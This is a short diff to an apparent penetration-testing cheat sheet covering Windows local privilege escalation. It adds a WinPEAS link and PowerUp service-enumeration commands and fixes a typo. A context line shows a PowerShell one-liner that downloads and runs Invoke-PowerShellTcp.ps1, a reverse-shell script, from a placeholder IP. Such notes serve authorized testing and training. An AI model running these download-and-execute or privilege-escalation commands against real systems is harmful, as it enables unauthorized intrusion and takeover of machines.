@@ -395,7 +395,12 @@ Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 ```
 
 # Local privilege escalation
-Focussing on Service issues
+Focusing on Service issues
+
+*Only target Services you can restart*
+#### WinPeas
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+
 #### Privesc check all
 https://github.com/enjoiz/Privesc
 ```
@@ -419,6 +424,7 @@ Invoke-allchecks
 ####  Run powerup get services with unqouted paths and a space in their name
 ```
 Get-ServiceUnquoted -Verbose
+Get-ModifiableService -Verbose
 Get-ModifiableServiceFile -Verbose
 ```
 
